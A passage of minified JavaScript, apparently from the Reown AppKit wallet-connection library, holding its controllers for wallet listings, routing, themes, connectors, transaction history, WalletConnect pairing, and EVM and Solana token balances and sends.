Response&&e.cause.status===Ht.HTTP_STATUS_CODES.FORBIDDEN&&!Eh.reportedErrors.FORBIDDEN&&(ou.open({shortMessage:"Invalid App Configuration",longMessage:`Origin ${u5()?window.origin:"uknown"} not found on Allowlist - update configuration on cloud.reown.com`},"error"),Eh.reportedErrors.FORBIDDEN=!0)}},sendEvent(r){Eh.timestamp=Date.now(),Eh.data=r,Be.state.features?.analytics&&Hr._sendAnalyticsEvent(Eh)}},GXe=Ze.getApiUrl(),la=new J4({baseUrl:GXe,clientId:null}),ZXe=40,jV=4,YXe=20,Er=sr({promises:{},page:1,count:0,featured:[],allFeatured:[],recommended:[],allRecommended:[],wallets:[],filteredWallets:[],search:[],isAnalyticsEnabled:!1,excludedWallets:[],isFetchingRecommendedWallets:!1}),rt={state:Er,subscribeKey(r,e){return ci(Er,r,e)},_getSdkProperties(){const{projectId:r,sdkType:e,sdkVersion:t}=Be.state;return{projectId:r,st:e||"appkit",sv:t||"html-wagmi-4.2.2"}},_filterOutExtensions(r){return Be.state.isUniversalProvider?r.filter(e=>!!(e.mobile_link||e.desktop_link||e.webapp_link)):r},async _fetchWalletImage(r){const e=`${la.baseUrl}/getWalletImage/${r}`,t=await la.getBlob({path:e,params:rt._getSdkProperties()});Ia.setWalletImage(r,URL.createObjectURL(t))},async _fetchNetworkImage(r){const e=`${la.baseUrl}/public/getAssetImage/${r}`,t=await la.getBlob({path:e,params:rt._getSdkProperties()});Ia.setNetworkImage(r,URL.createObjectURL(t))},async _fetchConnectorImage(r){const e=`${la.baseUrl}/public/getAssetImage/${r}`,t=await la.getBlob({path:e,params:rt._getSdkProperties()});Ia.setConnectorImage(r,URL.createObjectURL(t))},async _fetchCurrencyImage(r){const e=`${la.baseUrl}/public/getCurrencyImage/${r}`,t=await la.getBlob({path:e,params:rt._getSdkProperties()});Ia.setCurrencyImage(r,URL.createObjectURL(t))},async _fetchTokenImage(r){const e=`${la.baseUrl}/public/getTokenImage/${r}`,t=await la.getBlob({path:e,params:rt._getSdkProperties()});Ia.setTokenImage(r,URL.createObjectURL(t))},_filterWalletsByPlatform(r){return Ze.isMobile()?r?.filter(t=>t.mobile_link||t.id===cd.COINBASE.id?!0:de.state.activeChain==="solana"&&(t.id===cd.SOLFLARE.id||t.id===cd.PHANTOM.id)):r},async fetchProjectConfig(){return(await la.get({path:"/appkit/v1/config",params:rt._getSdkProperties()})).features},async fetchAllowedOrigins(){try{const{allowedOrigins:r}=await la.get({path:"/projects/v1/origins",params:rt._getSdkProperties()});return r}catch{return[]}},async fetchNetworkImages(){const e=de.getAllRequestedCaipNetworks()?.map(({assets:t})=>t?.imageId).filter(Boolean).filter(t=>!Es.getNetworkImageById(t));e&&await Promise.allSettled(e.map(t=>rt._fetchNetworkImage(t)))},async fetchConnectorImages(){const{connectors:r}=We.state,e=r.map(({imageId:t})=>t).filter(Boolean);await Promise.allSettled(e.map(t=>rt._fetchConnectorImage(t)))},async fetchCurrencyImages(r=[]){await Promise.allSettled(r.map(e=>rt._fetchCurrencyImage(e)))},async fetchTokenImages(r=[]){await Promise.allSettled(r.map(e=>rt._fetchTokenImage(e)))},async fetchWallets(r){const e=r.exclude??[];rt._getSdkProperties().sv.startsWith("html-core-")&&e.push(...Object.values(cd).map(s=>s.id));const i=await la.get({path:"/getWallets",params:{...rt._getSdkProperties(),...r,page:String(r.page),entries:String(r.entries),include:r.include?.join(","),exclude:e.join(",")}});return{data:rt._filterWalletsByPlatform(i?.data)||[],count:i?.count}},async fetchFeaturedWallets(){const{featuredWalletIds:r}=Be.state;if(r?.length){const e={...rt._getSdkProperties(),page:1,entries:r?.length??jV,include:r},{data:t}=await rt.fetchWallets(e),i=[...t].sort((s,o)=>r.indexOf(s.id)-r.indexOf(o.id)),n=i.map(s=>s.image_id).filter(Boolean);await Promise.allSettled(n.map(s=>rt._fetchWalletImage(s))),Er.featured=i,Er.allFeatured=i}},async fetchRecommendedWallets(){try{Er.isFetchingRecommendedWallets=!0;const{includeWalletIds:r,excludeWalletIds:e,featuredWalletIds:t}=Be.state,i=[...e??[],...t??[]].filter(Boolean),n=de.getRequestedCaipNetworkIds().join(","),s={page:1,entries:jV,include:r,exclude:i,chains:n},{data:o,count:a}=await rt.fetchWallets(s),c=Bt.getRecentWallets(),l=o.map(d=>d.image_id).filter(Boolean),u=c.map(d=>d.image_id).filter(Boolean);await Promise.allSettled([...l,...u].map(d=>rt._fetchWalletImage(d))),Er.recommended=o,Er.allRecommended=o,Er.count=a??0}catch{}finally{Er.isFetchingRecommendedWallets=!1}},async fetchWalletsByPage({page:r}){const{includeWalletIds:e,excludeWalletIds:t,featuredWalletIds:i}=Be.state,n=de.getRequestedCaipNetworkIds().join(","),s=[...Er.recommended.map(({id:u})=>u),...t??[],...i??[]].filter(Boolean),o={page:r,entries:ZXe,include:e,exclude:s,chains:n},{data:a,count:c}=await rt.fetchWallets(o),l=a.slice(0,YXe).map(u=>u.image_id).filter(Boolean);await Promise.allSettled(l.map(u=>rt._fetchWalletImage(u))),Er.wallets=Ze.uniqueBy([...Er.wallets,...rt._filterOutExtensions(a)],"id").filter(u=>u.chains?.some(d=>n.includes(d))),Er.count=c>Er.count?c:Er.count,Er.page=r},async initializeExcludedWallets({ids:r}){const e={page:1,entries:r.length,include:r},{data:t}=await rt.fetchWallets(e);t&&t.forEach(i=>{Er.excludedWallets.push({rdns:i.rdns,name:i.name})})},async searchWallet({search:r,badge:e}){const{includeWalletIds:t,excludeWalletIds:i}=Be.state,n=de.getRequestedCaipNetworkIds().join(",");Er.search=[];const s={page:1,entries:100,search:r?.trim(),badge_type:e,include:t,exclude:i,chains:n},{data:o}=await rt.fetchWallets(s);Hr.sendEvent({type:"track",event:"SEARCH_WALLET",properties:{badge:e??"",search:r??""}});const a=o.map(c=>c.image_id).filter(Boolean);await Promise.allSettled([...a.map(c=>rt._fetchWalletImage(c)),Ze.wait(300)]),Er.search=rt._filterOutExtensions(o)},initPromise(r,e){const t=Er.promises[r];return t||(Er.promises[r]=e())},prefetch({fetchConnectorImages:r=!0,fetchFeaturedWallets:e=!0,fetchRecommendedWallets:t=!0,fetchNetworkImages:i=!0}={}){const n=[r&&rt.initPromise("connectorImages",rt.fetchConnectorImages),e&&rt.initPromise("featuredWallets",rt.fetchFeaturedWallets),t&&rt.initPromise("recommendedWallets",rt.fetchRecommendedWallets),i&&rt.initPromise("networkImages",rt.fetchNetworkImages)].filter(Boolean);return Promise.allSettled(n)},prefetchAnalyticsConfig(){Be.state.features?.analytics&&rt.fetchAnalyticsConfig()},async fetchAnalyticsConfig(){try{const{isAnalyticsEnabled:r}=await la.get({path:"/getAnalyticsConfig",params:rt._getSdkProperties()});Be.setFeatures({analytics:r})}catch{Be.setFeatures({analytics:!1})}},filterByNamespaces(r){if(!r?.length){Er.featured=Er.allFeatured,Er.recommended=Er.allRecommended;return}const e=de.getRequestedCaipNetworkIds().join(",");Er.featured=Er.allFeatured.filter(t=>t.chains?.some(i=>e.includes(i))),Er.recommended=Er.allRecommended.filter(t=>t.chains?.some(i=>e.includes(i))),Er.filteredWallets=Er.wallets.filter(t=>t.chains?.some(i=>e.includes(i)))},clearFilterByNamespaces(){Er.filteredWallets=[]},setFilterByNamespace(r){if(!r){Er.featured=Er.allFeatured,Er.recommended=Er.allRecommended;return}const e=de.getRequestedCaipNetworkIds().join(",");Er.featured=Er.allFeatured.filter(t=>t.chains?.some(i=>e.includes(i))),Er.recommended=Er.allRecommended.filter(t=>t.chains?.some(i=>e.includes(i))),Er.filteredWallets=Er.wallets.filter(t=>t.chains?.some(i=>e.includes(i)))}},zi=sr({view:"Connect",history:["Connect"],transactionStack:[]}),JXe={state:zi,subscribeKey(r,e){return ci(zi,r,e)},pushTransactionStack(r){zi.transactionStack.push(r)},popTransactionStack(r){const e=zi.transactionStack.pop();if(!e)return;const{onSuccess:t,onError:i,onCancel:n}=e;switch(r){case"success":t?.();break;case"error":i?.(),tt.goBack();break;case"cancel":n?.(),tt.goBack();break}},push(r,e){r!==zi.view&&(zi.view=r,zi.history.push(r),zi.data=e)},reset(r,e){zi.view=r,zi.history=[r],zi.data=e},replace(r,e){zi.history.at(-1)===r||(zi.view=r,zi.history[zi.history.length-1]=r,zi.data=e)},goBack(){const r=de.state.activeCaipAddress,e=tt.state.view==="ConnectingFarcaster",t=!r&&e;if(zi.history.length>1){zi.history.pop();const[i]=zi.history.slice(-1);i&&(r&&i==="Connect"?zi.view="Account":zi.view=i)}else Ri.close();zi.data?.wallet&&(zi.data.wallet=void 0),setTimeout(()=>{if(t){qt.setFarcasterUrl(void 0,de.state.activeChain);const i=We.getAuthConnector();i?.provider?.reload();const n=kd(Be.state);i?.provider?.syncDappData?.({metadata:n.metadata,sdkVersion:n.sdkVersion,projectId:n.projectId,sdkType:n.sdkType})}},100)},goBackToIndex(r){if(zi.history.length>1){zi.history=zi.history.slice(0,r+1);const[e]=zi.history.slice(-1);e&&(zi.view=e)}},goBackOrCloseModal(){tt.state.history.length>1?tt.goBack():Ri.close()}},tt=qa(JXe),_h=sr({themeMode:"dark",themeVariables:{},w3mThemeVariables:void 0}),pP={state:_h,subscribe(r){return ai(_h,()=>r(_h))},setThemeMode(r){_h.themeMode=r;try{const e=We.getAuthConnector();if(e){const t=pP.getSnapshot().themeVariables;e.provider.syncTheme({themeMode:r,themeVariables:t,w3mThemeVariables:Lf(t,r)})}}catch{console.info("Unable to sync theme to auth connector")}},setThemeVariables(r){_h.themeVariables={..._h.themeVariables,...r};try{const e=We.getAuthConnector();if(e){const t=pP.getSnapshot().themeVariables;e.provider.syncTheme({themeVariables:t,w3mThemeVariables:Lf(_h.themeVariables,_h.themeMode)})}}catch{console.info("Unable to sync theme to auth connector")}},getSnapshot(){return kd(_h)}},ao=qa(pP),lse={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0,cosmos:void 0},pi=sr({allConnectors:[],connectors:[],activeConnector:void 0,filterByNamespace:void 0,activeConnectorIds:{...lse},filterByNamespaceMap:{eip155:!0,solana:!0,polkadot:!0,bip122:!0,cosmos:!0}}),QXe={state:pi,subscribe(r){return ai(pi,()=>{r(pi)})},subscribeKey(r,e){return ci(pi,r,e)},initialize(r){r.forEach(e=>{const t=Bt.getConnectedConnectorId(e);t&&We.setConnectorId(t,e)})},setActiveConnector(r){r&&(pi.activeConnector=Ra(r))},setConnectors(r){r.filter(n=>!pi.allConnectors.some(s=>s.id===n.id&&We.getConnectorName(s.name)===We.getConnectorName(n.name)&&s.chain===n.chain)).forEach(n=>{n.type!=="MULTI_CHAIN"&&pi.allConnectors.push(Ra(n))});const t=We.getEnabledNamespaces(),i=We.getEnabledConnectors(t);pi.connectors=We.mergeMultiChainConnectors(i)},filterByNamespaces(r){Object.keys(pi.filterByNamespaceMap).forEach(e=>{pi.filterByNamespaceMap[e]=!1}),r.forEach(e=>{pi.filterByNamespaceMap[e]=!0}),We.updateConnectorsForEnabledNamespaces()},filterByNamespace(r,e){pi.filterByNamespaceMap[r]=e,We.updateConnectorsForEnabledNamespaces()},updateConnectorsForEnabledNamespaces(){const r=We.getEnabledNamespaces(),e=We.getEnabledConnectors(r),t=We.areAllNamespacesEnabled();pi.connectors=We.mergeMultiChainConnectors(e),t?rt.clearFilterByNamespaces():rt.filterByNamespaces(r)},getEnabledNamespaces(){return Object.entries(pi.filterByNamespaceMap).filter(([r,e])=>e).map(([r])=>r)},getEnabledConnectors(r){return pi.allConnectors.filter(e=>r.includes(e.chain))},areAllNamespacesEnabled(){return Object.values(pi.filterByNamespaceMap).every(r=>r)},mergeMultiChainConnectors(r){const e=We.generateConnectorMapByName(r),t=[];return e.forEach(i=>{const n=i[0],s=n?.id===Ht.CONNECTOR_ID.AUTH;i.length>1&&n?t.push({name:n.name,imageUrl:n.imageUrl,imageId:n.imageId,connectors:[...i],type:s?"AUTH":"MULTI_CHAIN",chain:"eip155",id:n?.id||""}):n&&t.push(n)}),t},generateConnectorMapByName(r){const e=new Map;return r.forEach(t=>{const{name:i}=t,n=We.getConnectorName(i);if(!n)return;const s=e.get(n)||[];s.find(a=>a.chain===t.chain)||s.push(t),e.set(n,s)}),e},getConnectorName(r){return r&&({"Trust Wallet":"Trust"}[r]||r)},getUniqueConnectorsByName(r){const e=[];return r.forEach(t=>{e.find(i=>i.chain===t.chain)||e.push(t)}),e},addConnector(r){if(r.id===Ht.CONNECTOR_ID.AUTH){const e=r,t=kd(Be.state),i=ao.getSnapshot().themeMode,n=ao.getSnapshot().themeVariables;e?.provider?.syncDappData?.({metadata:t.metadata,sdkVersion:t.sdkVersion,projectId:t.projectId,sdkType:t.sdkType}),e?.provider?.syncTheme({themeMode:i,themeVariables:n,w3mThemeVariables:Lf(n,i)}),We.setConnectors([r])}else We.setConnectors([r])},getAuthConnector(r){const e=r||de.state.activeChain,t=pi.connectors.find(i=>i.id===Ht.CONNECTOR_ID.AUTH);if(t)return t?.connectors?.length?t.connectors.find(n=>n.chain===e):t},getAnnouncedConnectorRdns(){return pi.connectors.filter(r=>r.type==="ANNOUNCED").map(r=>r.info?.rdns)},getConnectorById(r){return pi.allConnectors.find(e=>e.id===r)},getConnector(r,e){return pi.allConnectors.filter(i=>i.chain===de.state.activeChain).find(i=>i.explorerId===r||i.info?.rdns===e)},syncIfAuthConnector(r){if(r.id!=="ID_AUTH")return;const e=r,t=kd(Be.state),i=ao.getSnapshot().themeMode,n=ao.getSnapshot().themeVariables;e?.provider?.syncDappData?.({metadata:t.metadata,sdkVersion:t.sdkVersion,sdkType:t.sdkType,projectId:t.projectId}),e.provider.syncTheme({themeMode:i,themeVariables:n,w3mThemeVariables:Lf(n,i)})},getConnectorsByNamespace(r){const e=pi.allConnectors.filter(t=>t.chain===r);return We.mergeMultiChainConnectors(e)},selectWalletConnector(r){const e=We.getConnector(r.id,r.rdns),t=de.state.activeChain;FXe.handleMobileDeeplinkRedirect(e?.explorerId||r.id,t),e?tt.push("ConnectingExternal",{connector:e}):tt.push("ConnectingWalletConnect",{wallet:r})},getConnectors(r){return r?We.getConnectorsByNamespace(r):We.mergeMultiChainConnectors(pi.allConnectors)},setFilterByNamespace(r){pi.filterByNamespace=r,pi.connectors=We.getConnectors(r),rt.setFilterByNamespace(r)},setConnectorId(r,e){r&&(pi.activeConnectorIds={...pi.activeConnectorIds,[e]:r},Bt.setConnectedConnectorId(e,r))},removeConnectorId(r){pi.activeConnectorIds={...pi.activeConnectorIds,[r]:void 0},Bt.deleteConnectedConnectorId(r)},getConnectorId(r){if(r)return pi.activeConnectorIds[r]},isConnected(r){return r?!!pi.activeConnectorIds[r]:Object.values(pi.activeConnectorIds).some(e=>!!e)},resetConnectorIds(){pi.activeConnectorIds={...lse}}},We=qa(QXe),K5={ACCOUNT_TYPES:{SMART_ACCOUNT:"smartAccount"}},i1=Object.freeze({message:"",variant:"success",svg:void 0,open:!1,autoClose:!0}),gs=sr({...i1}),XXe={state:gs,subscribeKey(r,e){return ci(gs,r,e)},showLoading(r,e={}){this._showMessage({message:r,variant:"loading",...e})},showSuccess(r){this._showMessage({message:r,variant:"success"})},showSvg(r,e){this._showMessage({message:r,svg:e})},showError(r){const e=Ze.parseError(r);this._showMessage({message:e,variant:"error"})},hide(){gs.message=i1.message,gs.variant=i1.variant,gs.svg=i1.svg,gs.open=i1.open,gs.autoClose=i1.autoClose},_showMessage({message:r,svg:e,variant:t="success",autoClose:i=i1.autoClose}){gs.open?(gs.open=!1,setTimeout(()=>{gs.message=r,gs.variant=t,gs.svg=e,gs.open=!0,gs.autoClose=i},150)):(gs.message=r,gs.variant=t,gs.svg=e,gs.open=!0,gs.autoClose=i)}},ts=XXe,sn=sr({transactions:[],coinbaseTransactions:{},transactionsByYear:{},lastNetworkInView:void 0,loading:!1,empty:!1,next:void 0}),eet={state:sn,subscribe(r){return ai(sn,()=>r(sn))},setLastNetworkInView(r){sn.lastNetworkInView=r},async fetchTransactions(r,e){if(!r)throw new Error("Transactions can't be fetched without an accountAddress");sn.loading=!0;try{const t=await nr.fetchTransactions({account:r,cursor:sn.next,onramp:e,cache:e==="coinbase"?"no-cache":void 0,chainId:de.state.activeCaipNetwork?.caipNetworkId}),i=d5.filterSpamTransactions(t.data),n=d5.filterByConnectedChain(i),s=[...sn.transactions,...n];sn.loading=!1,e==="coinbase"?sn.coinbaseTransactions=d5.groupTransactionsByYearAndMonth(sn.coinbaseTransactions,t.data):(sn.transactions=s,sn.transactionsByYear=d5.groupTransactionsByYearAndMonth(sn.transactionsByYear,n)),sn.empty=s.length===0,sn.next=t.next?t.next:void 0}catch{const i=de.state.activeChain;Hr.sendEvent({type:"track",event:"ERROR_FETCH_TRANSACTIONS",properties:{address:r,projectId:Be.state.projectId,cursor:sn.next,isSmartAccount:qt.state.preferredAccountTypes?.[i]===K5.ACCOUNT_TYPES.SMART_ACCOUNT}}),ts.showError("Failed to fetch transactions"),sn.loading=!1,sn.empty=!0,sn.next=void 0}},groupTransactionsByYearAndMonth(r={},e=[]){const t=r;return e.forEach(i=>{const n=new Date(i.metadata.minedAt).getFullYear(),s=new Date(i.metadata.minedAt).getMonth(),o=t[n]??{},c=(o[s]??[]).filter(l=>l.id!==i.id);t[n]={...o,[s]:[...c,i].sort((l,u)=>new Date(u.metadata.minedAt).getTime()-new Date(l.metadata.minedAt).getTime())}}),t},filterSpamTransactions(r){return r.filter(e=>!e.transfers.every(i=>i.nft_info?.flags.is_spam===!0))},filterByConnectedChain(r){const e=de.state.activeCaipNetwork?.caipNetworkId;return r.filter(i=>i.metadata.chain===e)},clearCursor(){sn.next=void 0},resetTransactions(){sn.transactions=[],sn.transactionsByYear={},sn.lastNetworkInView=void 0,sn.loading=!1,sn.empty=!1,sn.next=void 0}},d5=qa(eet,"API_ERROR"),dn=sr({connections:new Map,wcError:!1,buffering:!1,status:"disconnected"});let Zp;const tet={state:dn,subscribeKey(r,e){return ci(dn,r,e)},_getClient(){return dn._client},setClient(r){dn._client=Ra(r)},async connectWalletConnect(){if(Ze.isTelegram()||Ze.isSafari()&&Ze.isIos()){if(Zp){await Zp,Zp=void 0;return}if(!Ze.isPairingExpired(dn?.wcPairingExpiry)){const r=dn.wcUri;dn.wcUri=r;return}Zp=ut._getClient()?.connectWalletConnect?.().catch(()=>{}),ut.state.status="connecting",await Zp,Zp=void 0,dn.wcPairingExpiry=void 0,ut.state.status="connected"}else await ut._getClient()?.connectWalletConnect?.()},async connectExternal(r,e,t=!0){await ut._getClient()?.connectExternal?.(r),t&&de.setActiveNamespace(e)},async reconnectExternal(r){await ut._getClient()?.reconnectExternal?.(r);const e=r.chain||de.state.activeChain;e&&We.setConnectorId(r.id,e)},async setPreferredAccountType(r,e){Ri.setLoading(!0,de.state.activeChain);const t=We.getAuthConnector();t&&(qt.setPreferredAccountType(r,e),await t.provider.setPreferredAccount(r),Bt.setPreferredAccountTypes(qt.state.preferredAccountTypes??{[e]:r}),await ut.reconnectExternal(t),Ri.setLoading(!1,de.state.activeChain),Hr.sendEvent({type:"track",event:"SET_PREFERRED_ACCOUNT_TYPE",properties:{accountType:r,network:de.state.activeCaipNetwork?.caipNetworkId||""}}))},async signMessage(r){return ut._getClient()?.signMessage(r)},parseUnits(r,e){return ut._getClient()?.parseUnits(r,e)},formatUnits(r,e){return ut._getClient()?.formatUnits(r,e)},async sendTransaction(r){return ut._getClient()?.sendTransaction(r)},async getCapabilities(r){return ut._getClient()?.getCapabilities(r)},async grantPermissions(r){return ut._getClient()?.grantPermissions(r)},async walletGetAssets(r){return ut._getClient()?.walletGetAssets(r)??{}},async estimateGas(r){return ut._getClient()?.estimateGas(r)},async writeContract(r){return ut._getClient()?.writeContract(r)},async getEnsAddress(r){return ut._getClient()?.getEnsAddress(r)},async getEnsAvatar(r){return ut._getClient()?.getEnsAvatar(r)},checkInstalled(r){return ut._getClient()?.checkInstalled?.(r)||!1},resetWcConnection(){dn.wcUri=void 0,dn.wcPairingExpiry=void 0,dn.wcLinking=void 0,dn.recentWallet=void 0,dn.status="disconnected",d5.resetTransactions(),Bt.deleteWalletConnectDeepLink()},resetUri(){dn.wcUri=void 0,dn.wcPairingExpiry=void 0,Zp=void 0},finalizeWcConnection(){const{wcLinking:r,recentWallet:e}=ut.state;r&&Bt.setWalletConnectDeepLink(r),e&&Bt.setAppKitRecent(e),Hr.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:r?"mobile":"qrcode",name:tt.state.data?.wallet?.name||"Unknown"}})},setWcBasic(r){dn.wcBasic=r},setUri(r){dn.wcUri=r,dn.wcPairingExpiry=Ze.getPairingExpiry()},setWcLinking(r){dn.wcLinking=r},setWcError(r){dn.wcError=r,dn.buffering=!1},setRecentWallet(r){dn.recentWallet=r},setBuffering(r){dn.buffering=r},setStatus(r){dn.status=r},async disconnect(r){try{await ut._getClient()?.disconnect(r)}catch(e){throw new Xw("Failed to disconnect","INTERNAL_SDK_ERROR",e)}},setConnections(r,e){dn.connections.set(e,r)},switchAccount({connection:r,address:e,namespace:t}){if(We.state.activeConnectorIds[t]===r.connectorId){const s=de.state.activeCaipNetwork;if(s){const o=`${t}:${s.id}:${e}`;qt.setCaipAddress(o,t)}else console.warn(`No current network found for namespace "${t}"`)}else{const s=We.getConnector(r.connectorId);s?ut.connectExternal(s,t):console.warn(`No connector found for namespace "${t}"`)}}},ut=qa(tet),cm=sr({loading:!1,open:!1,selectedNetworkId:void 0,activeChain:void 0,initialized:!1}),Zf={state:cm,subscribe(r){return ai(cm,()=>r(cm))},subscribeOpen(r){return ci(cm,"open",r)},set(r){Object.assign(cm,{...cm,...r})}},iT={createBalance(r,e){const t={name:r.metadata.name||"",symbol:r.metadata.symbol||"",decimals:r.metadata.decimals||0,value:r.metadata.value||0,price:r.metadata.price||0,iconUrl:r.metadata.iconUrl||""};return{name:t.name,symbol:t.symbol,chainId:e,address:r.address==="native"?void 0:this.convertAddressToCAIP10Address(r.address,e),value:t.value,price:t.price,quantity:{decimals:t.decimals.toString(),numeric:this.convertHexToBalance({hex:r.balance,decimals:t.decimals})},iconUrl:t.iconUrl}},convertHexToBalance({hex:r,decimals:e}){return Vx(BigInt(r),e)},convertAddressToCAIP10Address(r,e){return`${e}:${r}`},createCAIP2ChainId(r,e){return`${e}:${parseInt(r,16)}`},getChainIdHexFromCAIP2ChainId(r){const e=r.split(":");if(e.length<2||!e[1])return"0x0";const t=e[1],i=parseInt(t,10);return isNaN(i)?"0x0":`0x${i.toString(16)}`},isWalletGetAssetsResponse(r){return typeof r!="object"||r===null?!1:Object.values(r).every(e=>Array.isArray(e)&&e.every(t=>this.isValidAsset(t)))},isValidAsset(r){return typeof r=="object"&&r!==null&&typeof r.address=="string"&&typeof r.balance=="string"&&(r.type==="ERC20"||r.type==="NATIVE")&&typeof r.metadata=="object"&&r.metadata!==null&&typeof r.metadata.name=="string"&&typeof r.metadata.symbol=="string"&&typeof r.metadata.decimals=="number"&&typeof r.metadata.price=="number"&&typeof r.metadata.iconUrl=="string"}},FV={async getMyTokensWithBalance(r){const e=qt.state.address,t=de.state.activeCaipNetwork;if(!e||!t)return[];if(t.chainNamespace==="eip155"){const n=await this.getEIP155Balances(e,t);if(n)return this.filterLowQualityTokens(n)}const i=await nr.getBalance(e,t.caipNetworkId,r);return this.filterLowQualityTokens(i.balances)},async getEIP155Balances(r,e){try{const t=iT.getChainIdHexFromCAIP2ChainId(e.caipNetworkId);if(!(await ut.getCapabilities(r))?.[t]?.assetDiscovery?.supported)return null;const n=await ut.walletGetAssets({account:r,chainFilter:[t]});return iT.isWalletGetAssetsResponse(n)?(n[t]||[]).map(o=>iT.createBalance(o,e.caipNetworkId)):null}catch{return null}},filterLowQualityTokens(r){return r.filter(e=>e.quantity.decimals!=="0")},mapBalancesToSwapTokens(r){return r?.map(e=>({...e,address:e?.address?e.address:de.getActiveNetworkTokenAddress(),decimals:parseInt(e.quantity.decimals,10),logoUri:e.iconUrl,eip2612:!1}))||[]}},Bi=sr({tokenBalances:[],loading:!1}),ret={state:Bi,subscribe(r){return ai(Bi,()=>r(Bi))},subscribeKey(r,e){return ci(Bi,r,e)},setToken(r){r&&(Bi.token=Ra(r))},setTokenAmount(r){Bi.sendTokenAmount=r},setReceiverAddress(r){Bi.receiverAddress=r},setReceiverProfileImageUrl(r){Bi.receiverProfileImageUrl=r},setReceiverProfileName(r){Bi.receiverProfileName=r},setNetworkBalanceInUsd(r){Bi.networkBalanceInUSD=r},setLoading(r){Bi.loading=r},async sendToken(){try{switch(Si.setLoading(!0),de.state.activeCaipNetwork?.chainNamespace){case"eip155":await Si.sendEvmToken();return;case"solana":await Si.sendSolanaToken();return;default:throw new Error("Unsupported chain")}}finally{Si.setLoading(!1)}},async sendEvmToken(){const r=de.state.activeChain,e=qt.state.preferredAccountTypes?.[r];if(!Si.state.sendTokenAmount||!Si.state.receiverAddress)throw new Error("An amount and receiver address are required");if(!Si.state.token)throw new Error("A token is required");Si.state.token?.address?(Hr.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===K5.ACCOUNT_TYPES.SMART_ACCOUNT,token:Si.state.token.address,amount:Si.state.sendTokenAmount,network:de.state.activeCaipNetwork?.caipNetworkId||""}}),await Si.sendERC20Token({receiverAddress:Si.state.receiverAddress,tokenAddress:Si.state.token.address,sendTokenAmount:Si.state.sendTokenAmount,decimals:Si.state.token.quantity.decimals})):(Hr.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===K5.ACCOUNT_TYPES.SMART_ACCOUNT,token:Si.state.token.symbol||"",amount:Si.state.sendTokenAmount,network:de.state.activeCaipNetwork?.caipNetworkId||""}}),await Si.sendNativeToken({receiverAddress:Si.state.receiverAddress,sendTokenAmount:Si.state.sendTokenAmount,decimals:Si.state.token.quantity.decimals}))},async fetchTokenBalance(r){Bi.loading=!0;const e=de.state.activeCaipNetwork?.caipNetworkId,t=de.state.activeCaipNetwork?.chainNamespace,i=de.state.activeCaipAddress,n=i?Ze.getPlainAddress(i):void 0;if(Bi.lastRetry&&!Ze.isAllowedRetry(Bi.lastRetry,30*Di.ONE_SEC_MS))return Bi.loading=!1,[];try{if(n&&e&&t){const s=await FV.getMyTokensWithBalance();return Bi.tokenBalances=s,Bi.lastRetry=void 0,s}}catch(s){Bi.lastRetry=Date.now(),r?.(s),ts.showError("Token Balance Unavailable")}finally{Bi.loading=!1}return[]},fetchNetworkBalance(){if(Bi.tokenBalances.length===0)return;const r=FV.mapBalancesToSwapTokens(Bi.tokenBalances);if(!r)return;const e=r.find(t=>t.address===de.getActiveNetworkTokenAddress());e&&(Bi.networkBalanceInUSD=e?kXe.multiply(e.quantity.numeric,e.price).toString():"0")},async sendNativeToken(r){tt.pushTransactionStack({});const e=r.receiverAddress,t=qt.state.address,i=ut.parseUnits(r.sendTokenAmount.toString(),Number(r.decimals));await ut.sendTransaction({chainNamespace:"eip155",to:e,address:t,data:"0x",value:i??BigInt(0)}),Hr.sendEvent({type:"track",event:"SEND_SUCCESS",properties:{isSmartAccount:qt.state.preferredAccountTypes?.eip155===K5.ACCOUNT_TYPES.SMART_ACCOUNT,token:Si.state.token?.symbol||"",amount:r.sendTokenAmount,network:de.state.activeCaipNetwork?.caipNetworkId||""}}),ut._getClient()?.updateBalance("eip155"),Si.resetSend()},async sendERC20Token(r){tt.pushTransactionStack({onSuccess(){tt.replace("Account")}});const e=ut.parseUnits(r.sendTokenAmount.toString(),Number(r.decimals));if(qt.state.address&&r.sendTokenAmount&&r.receiverAddress&&r.tokenAddress){const t=Ze.getPlainAddress(r.tokenAddress);await ut.writeContract({fromAddress:qt.state.address,tokenAddress:t,args:[r.receiverAddress,e??BigInt(0)],method:"transfer",abi:RXe.getERC20Abi(t),chainNamespace:"eip155"}),Si.resetSend()}},async sendSolanaToken(){if(!Si.state.sendTokenAmount||!Si.state.receiverAddress)throw new Error("An amount and receiver address are required");tt.pushTransactionStack({onSuccess(){tt.replace("Account")}}),await ut.sendTransaction({chainNamespace:"solana",to:Si.state.receiverAddress,value:Si.state.sendTokenAmount}),ut._getClient()?.updateBalance("solana"),Si.resetSend()},resetSend(){Bi.token=void 0,Bi.sendTokenAmount=void 0,Bi.receiverAddress=void 0,Bi.receiverProfileImageUrl=void 0,Bi.receiverProfileName=void 0,Bi.loading=!1,Bi.tokenBalances=[]}},Si=qa(ret),nT={currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[],user:void 0},A8={caipNetwork:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]},pt=sr({chains:_J(),activeCaipAddress:void 0,activeChain:void 0,activeCaipNetwork:void 0,noAdapters:!1,universalAdapter:{networkControllerClient:void 0,connectionControllerClient:void 0},isSwitchingNamespace:!1}),iet={state:pt,subscribe(r){return ai(pt,()=>{r(pt)})},subscribeKey(r,e){return ci(pt,r,e)},subscribeChainProp(r,e,t){let i;return ai(pt.chains,()=>{const n=t||pt.activeChain;if(n){const s=pt.chains.get(n)?.[r];i!==s&&(i=s,e(s))}})},initialize(r,e,t){const{chainId:i,namespace:n}=Bt.getActiveNetworkProps(),s=e?.find(u=>u.id.toString()===i?.toString()),a=r.find(u=>u?.namespace===n)||r?.[0],c=r.map(u=>u.namespace).filter(u=>u!==void 0),l=Be.state.enableEmbedded?new Set([...c]):new Set([...e?.map(u=>u.chainNamespace)??[]]);(r?.length===0||!a)&&(pt.noAdapters=!0),pt.noAdapters||(pt.activeChain=a?.namespace,pt.activeCaipNetwork=s,de.setChainNetworkData(a?.namespace,{caipNetwork:s}),pt.activeChain&&Zf.set({activeChain:a?.namespace})),l.forEach(u=>{const 